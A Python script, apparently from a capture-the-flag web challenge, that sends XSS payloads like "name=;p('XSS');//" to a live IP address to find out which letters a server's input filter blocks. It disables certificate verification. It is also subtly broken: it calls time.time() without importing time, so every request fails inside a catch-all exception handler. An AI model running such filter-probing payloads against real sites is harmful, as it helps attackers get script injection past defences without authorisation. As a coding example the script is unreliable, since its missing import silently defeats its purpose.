import urllib.request
import urllib.parse
import urllib.error
import ssl
import json

print("Testing individual letters for character filter using urllib")
print("=" * 60)

url = "http://94.237.49.241:4200/page"
letters_to_test = ['p', 'q', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']

blocked_chars = []
allowed_chars = []

# Create SSL context to ignore certificate errors for HTTPS if needed
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

for i, letter in enumerate(letters_to_test):
    payload = f"name=;{letter}('XSS');//"
    encoded_payload = payload
    
    print(f"\nTesting letter '{letter}' ({i+1}/{len(letters_to_test)})")
    print(f"Payload: {payload}")
    
    try:
        # Create request data
        data = encoded_payload.encode('ascii')
        
        # Create request object
        req = urllib.request.Request(url, data=data, method='POST')
        req.add_header('Content-Type', 'application/x-www-form-urlencoded')
        req.add_header('User-Agent', 'Mozilla/5.0 (compatible)')
        
        # Send request with timeout
        start_time = time.time()
        with urllib.request.urlopen(req, timeout=30, context=ssl_context) as response:
            response_data = response.read().decode('utf-8', errors='ignore')
            elapsed = time.time() - start_time
            
            print(f"  Response received in {elapsed:.2f}s")
            print(f"  Status Code: {response.status}")
            
            # Check for blocked message
            blocked_pattern = f"Sorry you can't use: '{letter}'"
            
            if blocked_pattern in response_data:
                print(f"  [BLOCKED] Character '{letter}' is blocked!")
                print(f"  Found: '{blocked_pattern}'")
                blocked_chars.append(letter)
                # Show relevant line
                for line in response_data.split('\n'):
                    if blocked_pattern in line:
                        print(f"  Line: {line.strip()}")
                        break
            else:
                print(f"  [ALLOWED] Character '{letter}' is NOT blocked")
                allowed_chars.append(letter)
                
                # Show response snippet
                snippet = response_data.strip()
                if len(snippet) < 200:
                    print(f"  Response: {snippet}")
                else:
                    print(f"  Response length: {len(snippet)} chars")
                    # Look for interesting content
                    if "Hello" in snippet or "XSS" in snippet or "alert" in snippet:
                        interesting = [line for line in snippet.split('\n') if any(word in line for word in ['Hello', 'XSS', 'alert'])]
                        if interesting:
                            print(f"  Interesting lines: {interesting[:3]}")
        
    except urllib.error.URLError as e:
        error_msg = str(e)
        if "timeout" in error_msg.lower():
            print(f"  [ERROR] Request timed out for letter '{letter}'")
        else:
            print(f"  [ERROR] URLError for letter '{letter}': {error_msg}")
    except Exception as e:
        print(f"  [ERROR] Unexpected error for letter '{letter}': {str(e)}")

# Summary
print("\n" + "=" * 60)
print("CHARACTER FILTER TEST SUMMARY")
print("=" * 60)
print(f"Blocked characters ({len(blocked_chars)}): {blocked_chars}")
print(f"Allowed characters ({len(allowed_chars)}): {allowed_chars}")
print("\nTest completed.")
